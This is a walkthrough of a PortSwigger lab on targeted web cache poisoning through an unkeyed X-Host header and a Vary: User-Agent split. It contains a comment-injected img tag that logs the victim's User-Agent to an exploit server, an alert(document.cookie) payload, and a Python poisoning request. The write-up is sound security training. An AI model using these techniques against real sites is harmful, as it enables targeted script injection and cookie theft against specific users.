# Targeted web cache poisoning using an unknown header

**Category:** Web Cache Poisoning
**Difficulty:** PRACTITIONER
**Lab:** https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-targeted-using-an-unknown-header

Every lab so far poisoned the cache for *everyone*. That's not always what an attacker wants, and it's not always what the cache configuration allows — a `Vary` header can split the cache into separate entries per client characteristic, which cuts both ways: it limits collateral damage, but it also hands an attacker who can identify a specific victim a way to poison a cache entry that only that victim will ever see.

## The Target

The application caches responses and varies them by `User-Agent`. A resource-import script tag pulls in `/resources/js/tracking.js` using a hostname built from a header value — but unlike the earlier labs, none of the well-known `X-Forwarded-*` candidates were the one doing it.

## The Investigation

We extended our header fuzzing list well past the usual `X-Forwarded-Host` suspects — `X-Host`, `X-Backend-Host`, `X-Proxy-Host`, `X-Original-Host`, along with IP-forwarding headers — and sent each with a canary value against a cache-busted URL. `X-Host` was the one that reflected: the canary showed up building the same kind of resource-import URL we'd seen `X-Forwarded-Host` control in the first lab.

Checking the response's `Vary` header confirmed `User-Agent` was part of it. That changes the exploitation model entirely — poisoning the default cache entry with our own User-Agent wouldn't touch the victim's session at all, since they'd be served their own separately-cached entry. We needed the victim's exact User-Agent string before poisoning would do anything useful against them.

To get it, we used the blog's comment functionality as a covert logging channel: posting a comment containing `<img src="https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/ua-log">` causes any browser that later views the comment to request that image, and the exploit server's access log captures the requesting browser's `User-Agent` header along with it. We fetched a CSRF token from the target post page, submitted the comment, then polled the exploit server's log endpoint until an entry showed up that wasn't our own scripted request.

## The Exploit

With the victim's User-Agent captured from the log, we stored the payload on the exploit server at the resource path the target imports:

```
responseFile: /resources/js/tracking.js
responseBody: alert(document.cookie)
```

Then we poisoned the cache using both the unkeyed header *and* the victim's exact captured User-Agent string, so the poisoned response landed in the specific cache partition the victim's browser would read from:

```python
r = await client.get(lab_url, headers={
    "X-Host": exploit_host,
    "User-Agent": victim_ua,
})
```

We verified the poison against that same User-Agent string, then kept the poison-and-check loop running so a fresh copy stayed in the victim's cache partition until they next loaded the page.

## Comparing Notes: PortSwigger's Official Solution

PortSwigger's solution follows the same three-part chain: use Param Miner (or manual fuzzing) to discover the unkeyed header, confirm `Vary: User-Agent` splits the cache per client, and capture the victim's User-Agent via a comment containing an `<img>` tag pointed at the exploit server's access log. The mechanism matches ours exactly, including using the blog comment as the UA-logging vector — there isn't really another channel this lab exposes for reading arbitrary visitor metadata, so both paths converge on it.

The meaningful takeaway from our own solve isn't the technique divergence — there isn't one — but the reminder embedded in the discovery step: `X-Host` isn't a header most people would guess first. Any header-fuzzing approach that stops at the well-known `X-Forwarded-*` family will walk right past this lab's actual vulnerability.

## What This Teaches Us

`Vary` headers exist to prevent exactly the kind of collateral, everyone-gets-poisoned outcome the earlier labs demonstrated — which makes them look like a mitigation. They're not one here; they're a targeting mechanism. An attacker who can read a victim's User-Agent from anywhere the application exposes visitor metadata (logs, analytics dashboards, or in this case a covert image-request channel of our own construction) can use `Vary` to aim a poisoned cache entry at a single person instead of the whole userbase. That's a meaningfully different threat model than the earlier labs — narrower blast radius, but far harder to detect after the fact, since the poisoned entry never shows up for anyone monitoring the site as a normal visitor.
